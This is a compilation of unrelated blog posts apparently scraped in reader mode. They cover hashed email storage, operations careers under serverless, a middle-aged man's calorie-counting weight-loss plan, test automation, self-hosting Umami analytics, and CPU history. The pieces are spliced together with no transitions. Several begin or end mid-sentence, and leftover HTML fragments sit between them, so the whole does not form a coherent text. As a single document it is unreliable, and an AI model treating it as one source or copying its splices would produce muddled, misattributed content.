<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Earlier this year, when I went from having only Facebook-login on <a href="https://wishy.gift/">Wishy.gift</a> to allow registrations with email address and password, one of my concerns was how to implement this is a way that protects the data and privacy of my users. I don’t have any ads or analytics on the site, the users can select whatever display name they want, and I never stored the email addresses I got from Facebook when a user registered or logged in - only a hashed<sup><a href="#fn1" id="fnref1">[1]</a></sup> version of the ID. Email addresses and passwords, on the other hand, are a whole other beast, and the consequences of a database breach much worse.</p>
<p>Considering that the only kind of emails I ever need to send out are transactional - no newsletters or other kinds of notifications - the only thing I need to store them for are as identifiers, and can safely be hashed.</p>
<p>For every transactional email I need to send out - registration, account recovery, and email change verification - the user always initiates this by submitting their email address, and it will at that time be available to the backend to perform the needed action.</p>
<p>In conclusion, if you only use email addresses for transactional emails, you might be able to only store hashed versions of them. For <a href="https://wishy.gift/">Wishy.gift</a> I use SHA512 with a fixed salt, and this has been working perfectly since implementation in June.</p>

						<p>Have you seen <a href="https://medium.com/@jeremydaly/lambda-a-serverless-musical-cf8ec5d522e1?" target="_blank" rel="noopener noreferrer">Lambda: A Serverless Musical</a>?</p>
<p>If not, you really have to. I love Hamilton, I love serverless, and I’m not trying to be a crank or a killjoy or police people’s language. BUT, unfortunately, the chorus chose to double-down on one of the stupidest and most dangerous tendencies the serverless movement has had from day one: misunderstanding and trash-talking operations.</p>
<p><i>“I’m gonna reduce your… ops</i><br>
<i>I’m gonna reduce your… ops”</i></p>
<p>Well, I hate to tell you, but…</p>
<p><i>“No, I am not throwing away my… ops.</i><br>
<i>And you’re not throwing away my… ops.”</i></p>
<p>Or anyone else’s for that matter.</p>
<p>Even if you don’t run any servers or have any infrastructure of your own, you’ll still have to deal with operability and operations engineering problems. I hate to be the bearer of bad news (not really), but the role of operations isn’t going away. At best, the shifts that supposedly reduce your ops are simply delegating the operability of your stack to someone that does it better. The reality for most teams is that operations engineering is more necessary than ever.</p>
<p>Beyond Hamilton clap backs, that distinction matters because it has real career ramifications for engineers who, like me, are so operationally minded. Where are Ops careers heading?</p>
<h2>Where Does Ops Fit, Anyway?</h2>
<p>In some corners of engineering, “ops” is straight up used as a synonym for toil and manual labor. There is no good ops, only dead ops. The existence of ops is a technical failure: a blemish to be automated away, eradicated by adding more and more code. Code defeats toil. Dev makes ops obsolete. #NoOps!</p>
<p>If this is such an inexorable march towards utopia, maybe someone can explain to me why the shops that flirt the hardest with #NoOps have been, without exception, such humanitarian disasters?</p>
<p>Or, I’ll start. Operations is ridiculously important. When you denigrate it and diminish it, that’s the first sign that you aren’t doing it well. The way to do something well generally starts with adding focus and rigor, not writing it off.</p>
<p>Consider Business Development and Operations. Business is the why, development is the what, operations is the how. Operations is the constellation of your organizational memory: patterns, practices, habits, defaults, aspirations, expertise, tools, and everything else used to deliver business value to users.</p>
<p>The value of serverless isn’t found in “less ops.” Less ops doesn’t yield better systems than more ops, any more than fewer lines of code means better software. The value of serverless is unlocked by clear and powerful abstractions that let you delegate running large portions of your infrastructure to other people who can do it better than you — yes, because of economies of scale, but more so because that’s their core business model. YOUR core business model probably has nothing to do with infrastructure.</p>
<p>Because of that, a great sort is now happening between software engineering, infrastructure operations, and core business value.</p>
<h2>What Is Infrastructure?</h2>
<p>Infrastructure is software support. It’s the prerequisite thing you <i>have</i> to do, in order to get to the stuff you <i>want</i> to do. It’s not what you want to be doing, yet your business goals presume its existence.</p>
<p>An important quality of infrastructure is that it typically changes less often and is more stable than the software that constitutes your core business value. The features you ship to customers are typically under constant or frequent development, and they change at the rate of pull requests and commits (in fact, the velocity of these changes can be a critical competitive advantage). Infrastructure, on the other hand, changes at a more glacial pace — at the rate of package managers, OS updates, and new machine images. It’s seconds-to-minutes versus hours-to-days.</p>
<p>This dividing line between infrastructure and core business value even holds true for companies whose business model is building infrastructure for other companies. For example, a company providing email focuses on products that consist of email workflow features that are constantly being developed and shipped to users. There isn’t much new business value to be wrung out of modifying commodity SMTP transport layers or optimizing IMAP servers.</p>
<p>To its credit, serverless is perhaps the first trend to have really understood and powerfully leveraged that dividing line. IaaS, PaaS, and full-service suites like Gitlab were all germinal forms of this shift. “Cloud native” was also, arguably, another lurch in that direction. But where has that taken our industry?</p>
<h2>*-As-a-Service Is Really Just Code for “Outsourcing”</h2>
<p>IaaS, PaaS, and even FaaS/serverless are really all just types of outsourcing. But yet we don’t call it “outsourcing” when we rely on companies like AWS to run our datacenter and provide compute or storage, or when we use Google apps for our email, documents, and spreadsheets?</p>
<p>Historically, “outsourcing” is what we call shifting work off-premises when we aren’t yet comfortable with the arrangement; whether because the fit is awkward, the support is incomplete, or the service isn’t on par with what we could do ourselves. With infrastructure outsourcing, service quality is now creeping up the stack. More and more complex subsystems are becoming commodity components: and other companies utilize them to build their own businesses (or other infrastructure!) on top.</p>
<p>When I started my career, I was a jack-of-all-trades systems person. I ran mail, web, db, DNS, cache, deploys, CI/CD, patched operating systems, built debs and rpms, etc, etc. Most engineers don’t do those things now, and nor do I. Why would I, when I can pay someone else to abstract those details away, so that I can spend my time focusing on delivering customer value?</p>
<p>Increasingly, as an industry, we are outsourcing any bits that we can.</p>
<p>As a more personal example, why would you want to run your own observability team or build your own in-house monitoring software, if that’s not your core business? Why split your focus to building a bespoke and unsustainable version of a thing when you can readily buy a world-class version? If my company has had ten or twenty full-time engineers working on that solution, how long will it be until your team of three or five can catch up?</p>
<p>In a post-cloud world, we’ve learned that it’s usually much better and far easier to buy than it is to build those things that don’t add business value.</p>
<h2>How to Outsource Things Well</h2>
<p>In my personal example, buying doesn’t mean that you shouldn’t have an observability team. It means that the observability team should turn their gaze inward. That team should take a page out of the SRE or test community’s books and focus on providing value for your org’s developers whenever they interact with this outsourced solution.</p>
<p>That team should write libraries, generate examples, and drive standardization; ushering in consistency, predictability, and usability. They should partner with internal teams to evaluate use cases. They should partner with your vendors as roadmap stakeholders. They might also write glue code and helper modules to connect disparate data sources and create cohesive visualizations. Basically, that team becomes an integration point between your organization and the outsourced work.</p>
<p>We already <a href="https://cloudplatformonline.com/rs/248-TPC-286/images/DORA-State%20of%20DevOps.pdf" target="_blank" rel="noopener noreferrer">know from industry research</a> that the key to success when outsourcing is to embed those off-prem contributions within cross-functional teams, which manage integrating that work back into the broader organization.</p>
<p>Monstrous amounts of engineering work create the stack that ships value to your customers. Trying to save work, some teams build complicated Rube Goldberg machines that are brutal to run, change, and debug. It’s much harder to build simple platforms with operable, intelligible components that provide a humane user experience. Bridging that gap requires quality operations engineering to streamline that outsourcing for successful user adoption.</p>
<p>That’s why even if you run no servers and have no infrastructure of your own, you still have operability and operations problems to contend with. Getting to the point where your org successfully has no infrastructure of its own takes a lot of world-class operations expertise. Staying there is even harder. Any jerk with a credit card can just go spin up a server you’re now responsible for. Try being any sort of roadblock and see how quickly that happens.</p>
<h2>What This Means For Operationally Minded Engineers</h2>
<p>The reality is that jack-of-all-trades systems infrastructure jobs are slowly vanishing: the world doesn’t need thousands of people who can expertly tune postfix, SpamAssassin and ClamAV — the world has Gmail. You might find your next job by following the trail of technologies you know, like getting hired as a MySQL expert. But technologies come and go, so you should think carefully before hitching your cart to any particular piece of software. What will this mean for your career?</p>
<p>The industry is bifurcating along an infrastructure fault line, and the long-held indistinguishability between infrastructure-oriented engineers and operationally-minded engineers is swiftly eroding. These are becoming two different roles and career paths at two different kinds of companies: infrastructure providers, and the rest of them. Those of us who love optimizing, debugging, maintaining, and tackling weird systems problems far more than writing new greenfield code, now have a choice to make: go deep and specialize in infrastructure, or go broad on operability.</p>
<p>If the mission of your company is to solve a category problem by providing infrastructure to the world, then operations will always be a core part of that mission: your company thrives by solving that particular operability problem better than anyone. So you are justified in going deep and specializing in it, and figuring out how to do it better and more efficiently than anyone else in the world — so that other people don’t have to. But know that even this infrastructure-heavy backend work also needs design, product …</p></div></div>

Not when I was a kid, not when I was a young adult, and certainly not now, in my almost middle-age.</p><p>And I'm not even talking about having that shredded, six-pack look like the guys on the MensHealth covers, I'm just talking about a regular, flat tummy that doesn't bulge out in vague convex shape. I've always hovered between almost obese to dad-bod at best.</p><p>I've been self-conscious about my weight since forever. Being the fat kid in the 80s, when most kids weren't overweight yet left it's mark on my psyche and self-esteem. I got noticed and bullied for it, often. It also didn't help that my skin was pale enough to trip the sun when I took my shirt off on the beach.</p><p>All jokes aside, being able to swim in public without a shirt on has just never been in the realms of conceivability for me. The shame is too great.</p><p>Society, my community and my peers have made it very clear, since a young age, that nobody wants to see that shit. In fact, I don't think I've been in any form of public water without a shirt on since the age of 10. Maybe even earlier.</p><h2 id="when-the-dough-starts-to-rise">When the dough starts to rise</h2><p>I've learned to live with it, of course. The pale skin, the belly - it's not that bad. I mean, I've still managed to convince a poor, unsuspecting soul to be my wife. I still had fun outdoors. And getting older means nobody really cares about my appearance anymore, at least not to my face. Being doughy is not ideal but it's not that big a deal either.</p><p>I always assumed it's just the genetic cards I've been dealt, my unique biology or some sort of weird hormonal thing. This made sense to me because most of my extended family are overweight, and dangerously so. Maybe we're just built to look like this.</p><p>This idea might have a sliver of truth to it - I personally know people who look fit and fabulous without any seeming effort and who can eat whatever they like. </p><p>I, however, seem to gain weight by just looking at delicious food. But if I'm honest, declaring it impossible to slim down due to my genes might have just been a convenient excuse. </p><p>On my 38th birthday this year, I reflected on this, and the fact that my 40s were rapidly coming into view. I can see it emerging just over the horizon, arms and legs pumping as it's sprinting towards me. Soon.</p><p>I wasn't concerned with becoming unattractive with age(I've never been considered attractive anyway) but using my family history as a rough model for extrapolation suggested that the physical shape I was in then was past the point of good-as-it-would-ever-be. Other thoughts circled around, about getting older, about my losing my health, mobility and vitality. </p><p>And the signs were certainly there. My weight and pant size had already started creeping up over the last couple of years. </p><p>I wasn't obviously overweight, don't get me wrong. Most people would have considered my weight quite normal, perhaps even slim when compared to most of society. </p><p>But the trend in measurements suggested that my future would involve an ever-increasing waistline, with the eventual addition of tent-like shirts, feebly trying to conceal the obvious. </p><p>Yep, the coming years would see me getting rounder, wrinklier and unhealthier. Not paler though, that wouldn't be possible. This bun could never be baked, my genes won't allow for it.</p><h2 id="middle-age-is-looming-let-s-set-a-crazy-goal-">Middle-age is looming - let's set a crazy goal!</h2><p>To my credit though, I did realise that being middle-aged didn't mean it's game over yet. Perhaps I could still steer this ship around, if I just put my mind to it.</p><p>I won't ever become that tasty, handsome dish that turns heads, but perhaps I could aim for a relatively healthy, strong, utilitarian body? Like Sean Connery(RIP) in those first James Bond films. Old-school fit.</p><p>And with that musing, on the eve of my biological new year, I made the resolution to give it one last, genuine shot. </p><p>I would do my best to attempt a solid, last-ditch effort in getting my stomach flat. My goal is cultivating an appearance that I won't necessarily want to show off, but that I'd at least not feel the need to cover up and hide.</p><p>The idea is too sport, by the end of this year or early the next, a completely flat stomach without having to suck it in. And I would endeavour to keep it that way, perpetually, for the foreseeable future.</p><p>This will be hard, and I know it. I've been down this road before. Though I was comfortable plump my whole life, I am no stranger to diets and exercise. I know them well.</p><h2 id="the-revolving-door-of-fad-diets">The revolving door of fad diets </h2><p>In fact, I've tried almost every diet you can think of - keto, vegetarian, calorie counting, Fit-For-Life, caveman, paleo diet, slow carb... you name it, I probably tried it. And I've had various levels of success, but none left me with consistent, long-lasting results. Never mind washboard abs.</p><p>At best I'd maybe lose a couple of kilos, hit the inevitable plateau, and then give up out of frustration and resentment. Or I'd start feeling feeble and sick, suffer from weak concentration, or just feel generally miserable.</p><p>There was also the issue of inevitable birthdays and celebrations interfering, where I didn't want to be a party-pooper, or deny myself life's simple pleasures either, but which then would usually result in me falling off the bus. </p><p>And the cheat days too. Not often, maybe once or twice on weekends. Those, I told myself, would be needed to keep myself sane and motivated, to keep the cravings at bay. But they were a trap. Cheat day's may not add more weight, but they certainly stop any progress dead in its tracks.</p><p>Then there's exercise. Although my foray into the myriad of options available were not as extensive as with diets(due to some personal health limitations), my results - or lack thereof - were similar.</p><p>I tried to do some form of exercise at least 3 times a week. These included rollerblading with the wife, bodyweight routines, weight lifting, martial arts, walks and even the infernal torture that is running. </p><p>Exercise seemed to have <em>some</em> effect on sharpening my curves, but had no measurable effect on the scale.</p><p>Safe to say, it was pretty daunting to decide to commit to yet another version of this whole rigmarole again. When you feel you've tried everything before, you're skeptical this time would be different. Which diet would I be following this time, which training schedule?</p><p>I could feel that "it's just genetics" excuse looming just behind my shoulder, smugly waiting to tell me, "I told you so. It's pointless."</p><p>But this is what I wanted to do, so I decided to break it down and approach it from first principles, or at the very least keep it dead simple.</p><h2 id="best-way-of-losing-weight-science-simplicity-patience-and-discipline">Best way of losing weight? Science, simplicity, patience and discipline</h2><p>First principles suggested I stop faffing around with diets that operate on clever narratives, assumptions and "magic" rules, and just look at what the science said. And the science was pretty consistent - calories matter above all else. </p><p>The majority of studies suggested that for most people, the amount of calories consumed determines your weight. Hormonal factors exist, but they're either negligible or applicable to a very, very, VERY small part of the population. You're likely not it.</p><p>Exercise does help, but in the modern world with its convenient packaged foods one can easily consume way more calories in a single day than you could realistically burn off in a week of exercising. And if you're not cognisant of the calories in your meals and snacks, you won't even know it when you're over-consuming.</p><p>Now, of course I've tried calorie counting before, and it worked alright, but still lead to the inevitable plateau and quit cycle. This was something I'd need to be mindful of. I'd need to be strict to the max.</p><p>I decided that this time I was going to be <em>extremely</em> disciplined and committed. The only bending of rules would be cheat meals(not days) on birthdays or other rare and special occasions. Not weekly, like I weaselled about with before. No other cheating would be tolerated at all.</p><p>And for exercise it would be just as simple. I would do weight training 3x a week, ala <a href="https://startingstrength.com/">Starting Strength</a>, because it's the only form of exercise I actually enjoy doing. That's it. Beyond that would just be whatever recreational activities we did with friends over weekends.</p><h3 id="calories-energy-in-energy-out">Calories - energy in, energy out</h3><p>I'm not going to give you a lecture on calories and the intricacies behind their workings in this post, you can look it up yourself. </p><p>The <em>only</em> thing you need to know to successfully lose weight is that you need to consume less calories than your body requires to maintain its current weight. That's it. And, of course, you need to muster the discipline or come up with hacks to stick to it.</p><p>"Not all calories are equal!", I hear some of you seethe, and yes, I've considered that too. I took it into account for this experiment as well. It will be addressed below.</p><h2 id="weight-loss-plan">Weight-loss plan</h2><h4 id="5-steps-calculate-adjust-simplify-measure-patience">5 Steps - calculate, adjust, simplify, measure, patience</h4><p><strong>Calculate</strong> - Google and find a free calorie calculator online, enter your particular details, and calculate the amount of daily calories you need to maintain your current weight. </p><p><strong>Adjust</strong> - To lose weight you need to reduce the amount of daily calories you consume.

    <h2>Why Automation Sucks (and how to make it better).</h2>
    <p>The concept of software automation is not new.  Since there have been flaky builds and mission-critical features, there has been the need to define software that can test it and report the results to humans.</p>
    <p>Automation was new to me when I worked at my first corporate job.  Having done front-end development for a few years prior, I was familiar with feature-focused development.  Working in the quality space was totally new.</p>
    <p>After working on automation for a few months, it became clear that writing correct, reliable automation can be difficult to implement.  Flaky tests, distributed codebases, and lack of time / resource investment leads to brittle automation test suites that break every time someone wants to merge into master.</p>
    <p>Developer skill is important to writing valuable tests.  Stakeholder buy-in to invest resources keeps the test suite healthy. With only a few months of neglect, automation can fall by the wayside and result in tests that don't reflect the health of a system.</p>
    <p>More recently, I have had the opportunity to help a couple of friends automate a project that has been easier to manage.  We started out by <b>defining a clear goal for the task we are automating</b>. The smaller scale and investment on helping out the client of our system, a QA tester looking to eliminate meaningless toil, has led to the development of a stable, healthier automation suite.</p>
    <h3>Automation is just testing</h3>
    <p>Like most things in software engineering, automation by itself does not solve all of your problems. The coolest automated testing architecture with multiple suites, parallel tests, and easy-to-use test writing tools will not fix poorly written tests.  Using the newest automation technology in the industry will not automatically fix your quality issues.  If a company doesn't invest enough resources into manual testing, the value of their automation suite starts to wane.</p>
    <p>It may seem that automation tools are solutions to the productivity difficulties of managing teams of QAs and developers doing exploration testing.  Swinging too far to the technology direction without solid exploratory testing will result in larger costs long-term.  The value of your automation suite is only as good as the integrity of tests it contains.  This integrity is maintained by investing in people who are looking to break the piece of software you are testing.</p>
    <h3>Engineers have bias</h3>
    <p>Even the most honest engineers have subconscious bias when writing code.  In the same way that professional authors send their manuscripts to editors, there will always be a need for outside input into a creation.</p>
    <p>This bias may be negligible, but it is often easy for an engineer to dismiss edge cases in a piece of software they have written with a casual "no one will use it that way".  When writing applications that need to have low amounts of defects, you must have a group of people trying to break the product.</p>
    <p>Having trained professionals who look to break a product will harden core features you develop. If quality is dire for your business, it is important that you maintain a solid number of these people to "wreck s#&amp;@".</p>
    <p>Only when you employ s&amp;*# wreckers can you isolate, solve, and write tests for edge cases that encompass large features in your software.</p>
    <h3>Birth of the Automation Queen</h3>
    <p>Finding engineers who are willing to solely work on automation may prove difficult.  However, using sweeping corporate speak on how "quality is everyone's problem" tends to make it no one's problem.</p><p>Engineers often put automation and quality low on their list of priorities when they do not have solid company investment.</p>
    <p>If one engineer on a team is tasked with automation and related tools full time, it can prove to be more manageable.  Depending on the amount of freedom you give them, Delving deep into the dark arts of automation and quality can be fun for the engineer.  Many quality engineers love the freedom that comes from a focus on writing solid tests and breaking the application.</p>
    <h3>Lack of Investment = Lip Service</h3>
    <p>Reliable automation doesn't just need planning.  If you want automation tests that stay updated and have purpose, you need people who are dedicated to maintaining them.</p>
    <p>When I say dedicated, I'm not talking about the ephemeral pictures that are put up all over you office building with eagles and wild horses running off into the mountains.  Dedicated engineers are engineers whose main job is to ensure automation tests and their surrounding systems are reliable AND valuable.  They need to work closely with devs who are building features to ensure that they are testing the most important functionality of a system.</p>
    <p>Upper management tends to focus on velocity over automation and uses coverage numbers to fill each level on the way up with a sense of false security.  In reality, many engineers either write fake tests and/or turn off test suites in order to get new releases .  They also tend to give out automation as grunt work to college interns, contractors, or new hires.</p>
    <p>Maintaining quality is everyone's job.  It is best solved by employing people who build software and people who break it.  You <b>must have people thinking on improving the quality of a system full time</b>.  Or at least the majority of the time. 10% focus on automation doesn't cut it.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For me, it is important to see analytics about my portfolio website. This way, I can see which posts got the most views, which country my users are from, and which browser &amp; operating system they are using.
The simplest solution to add analytics to your site is <a href="https://analytics.google.com/analytics/web/" target="_blank" rel="noopener noreferrer">Google Analytics</a> as it is free and easy to set up. But as we all know, this service is only free
as we pay it indirectly by providing data to it. <a href="https://www.comparitech.com/blog/vpn-privacy/google-analytics-privacy/" target="_blank" rel="noopener noreferrer">What you need to know about Google Analytics and privacy</a>.</p>
<p>In this blog post, I will show you how I replaced <a href="https://analytics.google.com/analytics/web/" target="_blank" rel="noopener noreferrer">Google Analytics</a> with <a href="https://umami.is/" target="_blank" rel="noopener noreferrer">Umami</a> which is a simple, easy to use, self-hosted web analytics solution.</p>
<h2>Umami</h2>
<p>I chose <a href="https://umami.is/" target="_blank" rel="noopener noreferrer">Umami</a> because it </p>
<ul>
<li>is <a href="https://github.com/mikecao/umami" target="_blank" rel="noopener noreferrer">open-source</a></li>
<li>is privacy-focused</li>
<li>simple</li>
<li>easy to use</li>
<li>has a <a href="https://app.umami.is/share/ISgW2qz8/flightphp.com" target="_blank" rel="noopener noreferrer">beautiful UI</a></li>
<li>has <a href="https://umami.is/docs/about" target="_blank" rel="noopener noreferrer">good documentation</a> </li>
</ul>
<p><img src="https://umami.is/intro.jpg" alt="Umami Intro"></p>
<p>Umami does not provide a hosting solution. Therefore, we need to host the service on our own. All you need to get Umami up and running is a database (either MySQL or PostgreSQL) and a server that can run Node.js (10.13 or newer). Check the <a href="https://umami.is/docs/hosting" target="_blank" rel="noopener noreferrer">list of available hosting solutions</a>.</p>
<p>I will show you two different approaches I tried to host Umami.</p>
<h3>Running on Heroku</h3>
<blockquote>
<p>Heroku is a container-based cloud Platform as a Service (PaaS). Developers use Heroku to deploy, manage, and scale modern apps. The platform is elegant, flexible, and easy to use, offering developers the simplest path to getting their apps to market.</p>
</blockquote>
<p>You can read more about <a href="https://www.heroku.com/" target="_blank" rel="noopener noreferrer">Heroku</a> on their <a href="https://www.heroku.com/about" target="_blank" rel="noopener noreferrer">“What is Heroku?”</a> page.</p>
<p>We can host Umami and a corresponding database for free on Heroku. The setup is well described in the <a href="https://umami.is/docs/running-on-heroku" target="_blank" rel="noopener noreferrer">Umami documentation</a>.</p>
<p>To get it running, I just had to modify the npm <code>start</code> script command to include the Heroku port: </p>
<div data-language="bash"><pre><code><span>"start"</span><span>:</span> <span>"next start -p <span>$PORT</span>"</span></code></pre></div>
<p>Using Heroku is for sure the easiest &amp; fastest way to set up a running Umami instance but there is one drawback: It is expensive.</p>
<p>I collected analytics data from my website for about 2 days and I quickly realized that the free “Hobby Dev” <a href="https://elements.heroku.com/addons/heroku-postgresql#pricing" target="_blank" rel="noopener noreferrer">Heroku Postgres plan</a> will not be enough.</p>

  </a>
    </span></p>
<p> This free plan includes 10,000 database rows and I filled ~1000 per day. So the free plan would be reached in about 10 days. The next “Hobby Basic” plan for 9$/month would include 10,000,000 rows which would last for approximately 27 years (assuming 1000 new rows per day, so no increasing traffic on my website). The “Standard 0” plan for 50$/month provides unlimited rows but this is way too much money I would spend for a self-hosted analytics solution.</p>
<h3>Running on DigitalOcean &amp; Vercel</h3>
<p> An alternative to Heroku is to host the database on <a href="https://m.do.co/c/833a8650eb62" target="_blank" rel="noopener noreferrer">Digital Ocean</a> and Umami on <a href="https://vercel.com/" target="_blank" rel="noopener noreferrer">Vercel</a>.</p>
<h4>DigitalOcean</h4>
<p><a href="https://m.do.co/c/833a8650eb62" target="_blank" rel="noopener noreferrer">Digital Ocean</a> is an affordable cloud hosting provider. Starting with 5$/month you get a cloud server for personal use and can scale it up as needed. Using <a href="https://m.do.co/c/833a8650eb62" target="_blank" rel="noopener noreferrer">this link</a> you get a $100 credit for the first 60 days.</p>
<p>I host a MySQL database on DigitalOcean which required these steps to set up:</p>

<li><a href="https://www.digitalocean.com/community/tutorials/initial-server-setup-with-ubuntu-18-04" target="_blank" rel="noopener noreferrer">Initial setup the server with Ubuntu 18.04</a></li>

<p>DigitalOcean also provides a <a href="https://www.digitalocean.com/community/questions/how-to-allow-remote-mysql-database-connection" target="_blank" rel="noopener noreferrer">Node.js</a> droplet template that comes with Node.js, Ubuntu, and Nginx to host the Umami frontend. We will instead use <a href="https://vercel.com/" target="_blank" rel="noopener noreferrer">Vercel</a> as it is completely free.</p>
<h4>Vercel</h4>
<p><a href="https://vercel.com/" target="_blank" rel="noopener noreferrer">Vercel</a> is the company behind the framework <a href="https://nextjs.org/" target="_blank" rel="noopener noreferrer">Next.js</a> which is used by Umami and they provide a free frontend hosting service. As you can imagine, it is really easy to deploy a <a href="https://nextjs.org/" target="_blank" rel="noopener noreferrer">Next.js</a> application on <a href="https://vercel.com/" target="_blank" rel="noopener noreferrer">Vercel</a> as both applications are developed by the same company. </p>
<p>The setup is described in the <a href="https://umami.is/docs/running-on-vercel" target="_blank" rel="noopener noreferrer">official documentation</a>.</p>

<h2>Conclusion</h2>
<p>I can sleep better as I now know that no more data is sent from my website to Google. I still have the possibility to track
my website analytics but in a simpler and privacy-focused way. Setting up Umami is quite easy if you are familiar with
software like Ubuntu and MySQL/Postgres. </p>
<p>Of course, I know need to pay some money to store this analytics data on my server but for me, it is worth the money.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>My first serious attempt at understanding computer hardware happened during college, in 1994. One of the labs consisted in wiring a 4-bit processor to a series of switches and a LED display. The objective was to make a very simple operation: starting from zero, make the display increment one digit every time the switch is activated. Or, as it is commonly know, to make a <a href="https://en.wikipedia.org/wiki/Adder_(electronics)" target="_blank" rel="noopener noreferrer">bare bones half adder</a>.</p>
<p>That CPU was intended for teaching purposes; a squared wafer of silicon about 30 cm wide and large, with big capacitors and a whole circuitry system easily viewable with the naked eye. We could plug and unplug components of different resistance, capacity and voltage. The teacher explained to us that this contraption was a much simplified component, loosely based on the architecture of the <a href="https://en.wikipedia.org/wiki/Intel_4004" target="_blank" rel="noopener noreferrer">Intel 4004</a>, the first commercially available microprocessor, released in <em>annus mirabilis </em>1971.</p>
<p>To be honest, I could not really wire everything properly without some help from my classmates. I was puzzled, wrongfully lost in the perception that computers could not be that simple. Yet, with a bit of wiring and patience, indeed, the LED displayed the required bits (no pun intended) of a very simple calculator in front of my eyes.</p>
<p>Seeing a set of wires and lights perform the simplest of all mathematical operations had quite an impact on me. Maths were no longer an abstract concept; with the proper hardware, maths could literally come to life. I felt the excitement and the wonder of those scientists who, in the 1940s and 1950s, discovered this fact and built a new science around it.</p>
<p>This CPU, as simple as it was, showed me what the soul of this new machine was made of.</p>
<h2>TANSTAAFL</h2>
<p>These days we read in the press about supercomputers built with CPUs featuring names seemingly borrowed from a science fiction novel. Take the <a href="https://en.wikipedia.org/wiki/POWER9" target="_blank" rel="noopener noreferrer">POWER9</a>, for example. According to Wikipedia, it is a “superscalar, multithreading, symmetric multiprocessor.” Not even <a href="https://en.wikipedia.org/wiki/HAL_9000" target="_blank" rel="noopener noreferrer">HAL 9000</a> received such attractive marketing buzzwords. The POWER9 is a real beast, used as the brains of one of the <a href="https://en.wikipedia.org/wiki/Summit_(supercomputer)" target="_blank" rel="noopener noreferrer">fastest supercomputers ever made</a>, at the time of this writing at least.</p>
<p>In 2004, Herb Sutter wrote “<a href="http://www.gotw.ca/publications/concurrency-ddj.htm" target="_blank" rel="noopener noreferrer">The Free Lunch Is Over</a>“, a seminal article announcing the end of the path for <a href="https://en.wikipedia.org/wiki/Moore%27s_law" target="_blank" rel="noopener noreferrer">Moore’s Law</a>. This quote stands out:</p>
<blockquote><p>That willingness is simply a clear indicator of the extreme pressure the chip designers face to deliver ever-faster CPUs; they’re under so much pressure that they’ll risk changing the meaning of your program, and possibly break it, in order to make it run faster.</p></blockquote>
<p>In the eyes of this author, three major changes followed this article.</p>
<p>The first was quite visible in computer magazines. Computer marketing had no other solution but to drop CPU speeds as a differentiating factor among competitors. After all, most CPUs have been capped at around 3 GHz, and for almost 20 years now. As Graham observed during the discussions around this edition of the magazine, Steve Jobs never got his 3 GHz PowerPC G5 CPU from IBM, so he jumped ship to Intel. But he still did not immediately get a 3 GHz CPU, but rather, something called a “Core Duo”.</p>
<p>The second visible effect, and quite dramatic this time, was <a href="https://meltdownattack.com/" target="_blank" rel="noopener noreferrer">Meltdown and Spectre</a>. Security vulnerabilities using <em>precisely</em> those advanced CPU features, as attack vectors of unprecedented risk and virulence.</p>
<p>But from the perspective of the programmer, the third visible effect was the spread of multicore CPUs, now commonplace even in smartphones and small boards like the <a href="https://www.raspberrypi.org/" target="_blank" rel="noopener noreferrer">Raspberry Pi</a>, abundant in the drawers and behind the TV sets of most software developers reading these lines.</p>
<h2>Multicore</h2>
<p>The PC revolution happened on single-core CPUs running first single-threaded, then multithreaded applications. Is cloud and smartphone revolution currently based on multiple-core CPUs running single-threaded applications?</p>
<p>The availability of multicore CPUs at the end of the first decade of this millenium unleashed a new era in the programming of multithreaded apps.</p>
<p>First, technologies such as <a href="https://www.openmp.org/" target="_blank" rel="noopener noreferrer">OpenMP</a> and <a href="https://apple.github.io/swift-corelibs-libdispatch/" target="_blank" rel="noopener noreferrer">libdispatch</a> simplified the conceptual work of designing and writing applications for multicore CPUs, avoiding the requirement to write threading code, dealing with race conditions, semaphores, shared data, and other concepts.</p>
<p>Second, event loop libraries and runtimes such as <a href="https://nodejs.org/en/" target="_blank" rel="noopener noreferrer">Node.js</a>, <a href="https://libuv.org/" target="_blank" rel="noopener noreferrer">libuv</a> and <a href="https://libevent.org/" target="_blank" rel="noopener noreferrer">libevent</a> provided a different solution to the problem, avoiding multiprocessing altogether, at least from the point of view of the developer. Single threading and event loops for everyone.</p>
<p>Third, there was a the functional programming renaissance. This led in turn to two interesting trends: on one side the rise, of new and old languages such as <a href="https://scala-lang.org/" target="_blank" rel="noopener noreferrer">Scala</a>, <a href="http://learnyouahaskell.com/" target="_blank" rel="noopener noreferrer">Haskell</a>, and <a href="https://fsharp.org/" target="_blank" rel="noopener noreferrer">F#</a>; on the other, “classical” programming languages including functional programming concepts. To name a few: <a href="https://en.cppreference.com/w/cpp/language/lambda" target="_blank" rel="noopener noreferrer">C++</a>, <a href="https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/lambda-expressions" target="_blank" rel="noopener noreferrer">C#</a>, <a href="https://docs.oracle.com/javase/tutorial/java/javaOO/lambdaexpressions.html" target="_blank" rel="noopener noreferrer">Java</a>, <a href="https://www.php.net/manual/en/functions.anonymous.php" target="_blank" rel="noopener noreferrer">PHP</a>, <a href="https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/ProgrammingWithObjectiveC/WorkingwithBlocks/WorkingwithBlocks.html" target="_blank" rel="noopener noreferrer">Objective-C</a>; they all got lambdas and functional idioms retrofitted into them in one way or another.</p>
<p>The rising popularities of Python, Ruby and JavaScript during the Web 2.0 era are arguably also to blame in this evolution; not to mention the spread of the <a href="http://static.googleusercontent.com/media/research.google.com/es/us/archive/mapreduce-osdi04.pdf" target="_blank" rel="noopener noreferrer">MapReduce</a> processing model (2004) and the respective availability of <a href="https://hadoop.apache.org/" target="_blank" rel="noopener noreferrer">Hadoop</a> and other similar technologies.</p>
<h2>Virtualization</h2>
<p>Developers these days are quite detached from hardware considerations these days. I have made a career in a software world increasingly disconnected from that of hardware. Most of the time, I would say 90% of the time, the computers running my code were completely, absolutely, and hopelessly virtual.</p>
